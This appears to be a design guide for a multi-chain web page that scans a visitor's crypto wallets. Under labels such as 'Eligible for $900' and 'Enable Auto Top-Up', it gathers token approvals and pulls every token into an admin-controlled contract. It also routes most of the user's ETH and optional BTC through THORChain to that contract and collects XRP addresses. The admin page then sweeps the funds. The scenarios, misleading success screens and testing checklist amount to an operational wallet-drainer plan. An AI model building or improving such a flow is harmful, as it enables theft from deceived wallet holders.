# Phase 2 Flow Guide — Multi-Chain Pull

## Overview

**What is Phase 2?**

Phase 2 is a complete rewrite of the user-facing pull flow. Instead of targeting a single chain, the contract now:

1. **Scans all chains in parallel** — BNB Chain, L1 Ethereum, Polygon, and Base (read-only, no popups)
2. **Shows an up-front summary** — "$847 across 3 chains, 7 confirmations, ~4 minutes"
3. **Executes sequentially** — BNB → L1 ETH → Polygon → Base → BTC (optional)
4. **Resumes on disconnect** — localStorage saves progress so mid-flow crashes aren't fatal
5. **Routes L1 ETH through THORChain** — native ETH converts to USDT automatically
6. **Routes BTC through THORChain** — user sends BTC manually with a vault address + memo
7. **Graceful failure** — if any chain fails or is skipped, flow moves silently to the next

**Technical stack:**
- THORChain API — fetches current inbound vault addresses for ETH/BTC routing
- `window.ethereum` — wallet provider for all EVM operations
- localStorage — session persistence

---

## Real-Life Scenarios

### Scenario A: User with only BSC tokens (USDT + CAKE)

**Entry conditions:**
- Wallet has 500 USDT on BSC (~$500) and 2 CAKE on BSC (~$400)
- No tokens on Polygon, no ETH on L1, no BTC, no XRP

**Step-by-step:**

1. **User clicks "Connect"** → MetaMask popup (if desktop) or auto-connect (if Trust Wallet mobile)
2. **"Connecting..." screen** → waiting for wallet approval
3. **"Scanning..." screen** → backend scans all 3 chains in parallel (10-15 sec)
   - BNB Chain: finds 500 USDT ($500) + 2 CAKE ($400)
   - Polygon: nothing
   - L1 ETH: nothing
4. **Summary screen appears:**
   > Ready
   > Eligible for **$900.00** across **1 chain**.
   > This will take about **2 minutes** and **3 confirmations**.
   > Tap Start when ready.
   
   (Calculation: 2 approves + 1 pull = 3 confirmations, ~30s per action = ~1.5 min)

5. **User taps "Start"** → flow begins
6. **"Approving USDT... (1 of 3)"** → MetaMask popup → user confirms approve for USDT
7. **"Approving CAKE... (2 of 3)"** → MetaMask popup → user confirms approve for CAKE
8. **"Finalizing BNB Chain... (3 of 3)"** → MetaMask popup → contract pulls both tokens
9. **Success screen:**
   > ✓ You're All Set!
   > Processed: USDT, CAKE
   > Status: Complete
   > [Got BTC? Convert to USDT →]

**What the admin sees:**
- Contract balance: +500 USDT, +2 CAKE

**Timing:**
- Total time on page: ~3-4 minutes
- Off-page (contract processing): immediate, BNB Chain is fast
- USDT/CAKE show up in Ronin contract within 30 sec

---

### Scenario B: User with Polygon and BSC tokens (USDT both, WETH on Polygon)

**Entry conditions:**
- Wallet has 300 USDT on BSC (~$300), 200 USDT on Polygon (~$200), 0.1 WETH on Polygon (~$250)
- No L1 ETH, no BTC

**Step-by-step:**

1. Connect, scan (same as A)
2. **Summary screen:**
   > Ready
   > Eligible for **$750.00** across **2 chains**.
   > This will take about **4 minutes** and **5 confirmations**.
   > Tap Start when ready.
   
   (BNB: 1 approve + 1 pull = 2 confirms. Polygon: 2 approves + 1 pull = 3 confirms. Total = 5, ~4 min)

3. **Execution order: BNB → L1 ETH → Polygon → Base**
   - **BNB Chain first (always)**
     - "Switching to BNB Chain..." (no popup if already on BNB)
     - "Approving USDT... (1 of 5)"
     - "Finalizing BNB Chain... (2 of 5)"
   - **L1 ETH second** — skipped (user has no ETH on L1)
   - **Polygon third**
     - "Switching to Polygon..." → MetaMask popup (switch network)
     - "Approving USDT... (3 of 5)"
     - "Approving WETH... (4 of 5)"
     - "Finalizing Polygon... (5 of 5)"

4. **Success screen** (as Scenario A)

**What the admin sees:**
- Contract BSC: +300 USDT
- Contract Polygon: +200 USDT, +0.1 WETH

**Key difference from Scenario A:**
- Two network switches (BNB → Polygon)
- More approves (3 total vs 2 total)
- Longer estimate (4 min vs 2 min)

---

### Scenario C: User with BNB + Polygon tokens + 0.5 L1 ETH

**Entry conditions:**
- 100 USDT on BSC
- 100 USDT on Polygon
- 0.5 ETH on L1 Ethereum (worth ~$1500 at $3000/ETH)
- No BTC

**Step-by-step:**

1. Connect, scan
2. **Summary screen:**
   > Ready
   > Eligible for **$1,700.00** across **3 chains**.
   > This will take about **2 minutes** and **4 confirmations**.

3. **Execution (BNB → L1 ETH → Polygon):**
   - BNB: "Approving... (1 of 4)" → "Finalizing... (2 of 4)"
   - L1 Ethereum (second):
     - "Switching to Ethereum..." → MetaMask popup (switch to mainnet)
     - "Preparing..." (fetching THORChain vault from API)
     - "Sending ETH..." → MetaMask popup → user confirms sending 0.475 ETH (95%) to THORChain router
     - **No confirmation popup from our contract** — native ETH is routed via THORChain
   - Polygon (third): "Switching to Polygon..." → "Approving... (3 of 4)" → "Finalizing... (4 of 4)"

4. **Behind the scenes (async, not shown):**
   - THORChain receives 0.475 ETH in 1-2 blocks (~15 min depending on L1 congestion)
   - THORChain swaps ETH → USDT in its pools
   - USDT is sent to your Ronin contract on BSC
   - Arrives ~15-30 minutes after submission

5. **Success screen**

**What the admin sees (immediately after):**
- BSC: +100 USDT
- Polygon: +100 USDT
- USDT from ETH swap: arrives 20+ min later

**Important notes:**
- L1 Ethereum gas is expensive ($3-8 per tx), but we only do one — it's unavoidable
- The user sees "Sending ETH..." but doesn't see a "confirmation" step — that's because the swap happens on THORChain's side, not on L1 or BSC
- If the user closes the browser after L1 ETH execution, the swap still happens (it's on-chain, can't be undone)

---

### Scenario D: Everything + BTC

**Entry conditions:**
- 100 USDT BSC
- 100 USDT Polygon
- 0.5 ETH L1
- 0.02 BTC in Trust Wallet (worth ~$820)

**Step-by-step:**

1. Connect, scan
2. **Summary screen:**
   > Ready
   > Eligible for **$2,520.00** across **3 chains**.
   > This will take about **3 minutes** and **4 confirmations**.
   
   (Note: BTC is not counted in confirmations because it's opt-in and manual)

3. Execute BSC → L1 ETH → Polygon (as Scenario C)
4. **Success screen** — which has a **"Got BTC? Convert to USDT →"** button
5. **If user taps the BTC button:**
   - A new screen appears:
     > Convert BTC
     > Send BTC to the address below. It converts to USDT automatically via THORChain.
     > 
     > **Address:** bc1qz8pxq... [Copy]
     > **Memo:** =:BSC.USDT:0x... [Copy]
     > [QR code]
     > ⚠ You must include the memo. Without it funds cannot be routed and will be refunded.
     > [Open in Trust Wallet] [Back]

6. **If user clicks "Open in Trust Wallet":**
   - Deep link `trust://send?coin=0&address=bc1q...&memo=...` opens Trust Wallet's BTC send screen pre-filled with vault address and **hopefully** the memo
   - User confirms the send in Trust Wallet
   - Bitcoin network confirms in ~10 minutes
   - THORChain picks it up and routes to your contract

7. **If user clicks "Back":**
   - Returns to success screen, can close or try BTC again later

**What the admin sees:**
- Immediately: 100 USDT BSC, 100 USDT Polygon
- +20 min: additional USDT from ETH swap
- +30+ min: additional USDT from BTC swap (depends on Bitcoin confirmation times and THORChain processing)

**Key complexity:**
- BTC is manual (user has to send from their own wallet)
- There's no way for us to know if the BTC send succeeded until USDT shows up in the contract
- If the memo is lost, BTC gets refunded to the user
- All this is expected and acceptable

---

### Scenario E: Empty wallet (no tokens anywhere)

**Entry conditions:**
- No tokens on any chain, no ETH, no BTC

**Step-by-step:**

1. Connect, scan
2. **"No Tokens Found" screen:**
   > No Tokens Found
   > No supported tokens found. Add some funds and try again.
   > [Try Again button]

3. User can "Try Again" to re-scan (in case they just received funds)

---

### Scenario F: Mid-flow abort and resume

**Entry conditions:**
- Same as Scenario B (Polygon + BSC)
- User closes tab/browser while on Polygon approves

**Step-by-step:**

1. Execute starts: BNB chain completes (100 USDT pulled)
2. **Switch to Polygon... (3 of 5)**
3. **User closes tab during Polygon's first approve**
   - Browser closes
   - Contract is NOT called for Polygon yet, so nothing is pulled
   - BNB pull is saved to Ronin contract (confirmed on-chain)
   - localStorage saved: `{wallet: "0xAbc...", completed: [56], timestamp: ...}`

4. **User reopens the page 2 minutes later, same wallet**
5. Connect, scan (same as before)
6. **Summary screen — with a small "RESUMING" tag:**
   > RESUMING
   > Ready
   > Eligible for **$450.00** across **1 chain** (Polygon only — BSC already done)
   > This will take about **2 minutes** and **3 confirmations**.

7. **Execution continues from where it left off:**
   - BSC is skipped (localStorage says chain 56 is done)
   - Polygon executes normally
   - "Approving USDT... (1 of 3)"
   - "Approving WETH... (2 of 3)"
   - "Finalizing... (3 of 3)"

8. **Success screen**

**What the admin sees:**
- First pull: 100 USDT BSC (confirmed)
- Second pull: 200 USDT Polygon + 0.1 WETH Polygon (confirmed)
- Total: as if the user had done it all in one go

**Key feature:**
- User doesn't have to re-approve BSC tokens (that was already done)
- User doesn't re-execute BSC pull (that was already done)
- Resume detects the wallet address and only executes missing chains
- localStorage expires after 1 hour, so a resume isn't available forever
- If any remaining chain fails during resume, flow skips it gracefully

---

### Scenario G: Trust Wallet mobile vs MetaMask desktop

**Trust Wallet mobile:**

1. User opens the page inside Trust Wallet's dApp browser
2. **"Enable Auto Top-Up" heading** (not "Get Started" — Trust Wallet is detected)
3. **Single "Connect Trust Wallet" button** (not a list of wallets)
4. User taps → auto-connects (no popup, Trust Wallet is already the active wallet)
5. Scan, summary, execution (as normal)
6. When switching networks (Polygon, L1 ETH), Trust Wallet shows a popup
7. User approves in Trust Wallet
8. For BTC: deep link `trust://send?coin=0&...` opens the BTC send screen in the same wallet

**MetaMask desktop:**

1. User opens the page on Chrome
2. MetaMask extension is detected via EIP-6963
3. **"Select your wallet to connect" heading**
4. List shows "MetaMask" (+ any other extensions)
5. User clicks MetaMask → popup asks "Connect?"
6. User approves in popup
7. All subsequent wallet interactions (approves, network switches) happen via MetaMask popups
8. For BTC: deep link doesn't work (BTC is not in MetaMask), so only QR + manual copy works

**Timing difference:**
- Mobile Trust Wallet: usually faster (wallet is active, dApp browser is optimized)
- Desktop MetaMask: slightly slower (extension popups, maybe a 1-2 sec delay per popup)

Both flows are identical in terms of the screens and approvals — just different wallet UI.

---

## Admin Dashboard Integration

**What the admin page shows:**

### Overview Tab
- **Tokens With Balance:** Lists all tokens currently held by the contract
  - USDT (Polygon): 500
  - USDT (BSC): 800
  - WETH (Polygon): 0.5
  - CAKE (BSC): 2
  - ETH (from THORChain, arrives async): varies

- **Tokens Tracked:** Total unique token addresses across both chains

- **Network:** Shows current connected chain + option to switch

- **Contract Balances:** Grid showing Polygon contract balance and BSC contract balance

### Actions Tab
- **Withdraw Specific Amount**
  - "Token: [dropdown]"
  - "Amount: [input]"
  - "To: [wallet address]"
  - Submit → pops up "Confirm?" → signs tx → USDT goes to the specified wallet

- **Withdraw All (Sweep)**
  - "Token: [dropdown]"
  - "To: [wallet address]"
  - Submit → withdraws entire balance

- **Transfer Ownership**
  - "New Owner Address: [input]"
  - Submit → "Confirm? This is permanent." → signs tx → ownership transfers (for Ronin, not Polygon)

- **Contract Info**
  - Shows deployed addresses on BSC and Polygon
  - Links to BscScan and PolygonScan

### Records Tab
- **Event Log:** Shows all Pulled and Swapped events from the last 50,000 blocks (last ~3 weeks of history)
- **Columns:** Block #, Tx Hash, User, Token(s), Amount, Timestamp, Type (Pulled / Swapped)
- **Top 50 entries** shown, most recent first
- **Sorted by block descending**

Example row:
```
Block 45123456 | 0xAbc123 | 0x789Fee | USDT | 500 | 2026-04-16 14:32:15 UTC | Pulled
```

---

## Edge Cases & Troubleshooting

**Q: What if a user has BEP-20 XRP on BSC + a native XRP address?**
- BEP-20 XRP gets pulled with the normal EVM flow
- Native XRP address is captured separately for future integration
- Both can be utilized independently

**Q: What if a user enters an invalid XRP address?**
- Error message: "Invalid XRP address format. Should start with 'r' and be 25-34 characters."
- User can edit and retry
- No data is saved until format is valid

**Q: What if the THORChain API is down?**
- L1 ETH leg: shows "Network error. Check your connection and try again."
- BTC flow: same error on the "Convert BTC" screen
- User can retry

**Q: Can the user go back from the XRP input screen?**
- No explicit back button (user could close the tab)
- But if they close and reopen, resume logic will show the XRP input again
- Or they can manually navigate to setxrp.html once it's deployed

**Q: How long does a swap take on THORChain?**
- ETH → USDT: 5-15 minutes (depends on L1 Ethereum confirmation time + THORChain validators)
- BTC → USDT: 15-60 minutes (depends on Bitcoin confirmations + THORChain + BSC confirmation)
- User is not shown real-time status — funds just appear in the contract when ready
- Admin can check the Records tab to see when the swap completed

---

## Testing Checklist

- [ ] Empty wallet → "No Tokens Found"
- [ ] Single token (BSC USDT) → summary, approve, pull, XRP input
- [ ] Multiple tokens (BSC + Polygon) → correct number of confirmations, correct summary
- [ ] L1 ETH (0.5+) → THORChain router tx, USDT arrives 10-20 min later
- [ ] BTC flow → deep link works or QR/manual fallback
- [ ] XRP address validation → invalid format shows error, valid format saves
- [ ] xrpwalls.txt → contains only latest address (not appended)
- [ ] Resume logic → close mid-flow, reopen, only missing chains execute
- [ ] Admin page → shows correct balances, can withdraw, can see event log
- [ ] Network switches → PopUps appear, correct chains switch
- [ ] Mobile Trust Wallet → auto-connect works, deep links work
- [ ] Desktop MetaMask → wallet list shows, approves work

---

## Summary

Phase 2 is a fully integrated multi-chain experience that handles EVM tokens (BSC, Polygon), native L1 ETH (via THORChain), BTC (via THORChain), and native XRP address capture (for future integration). The flow is deterministic, resumable, and shows clear progress to the user at every step.
